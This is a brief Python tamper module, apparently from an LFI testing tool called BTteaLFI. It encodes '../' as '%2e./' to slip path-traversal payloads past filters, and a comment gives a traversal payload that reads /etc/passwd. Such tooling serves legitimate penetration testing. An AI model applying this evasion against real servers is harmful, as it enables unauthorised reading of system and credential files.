# BTteaLFI
# Copyright (C) 2024-2025 BTtea
#
# This file is licensed under GPLv2. See LICENSE.txt for details.

# page=../../../../etc/passwd  =>  page=%2e./%2e./%2e./%2e./etc/passwd

def tamper(payload:str):
    if payload:
        payload=payload.replace('../','%2e./')
    return payload
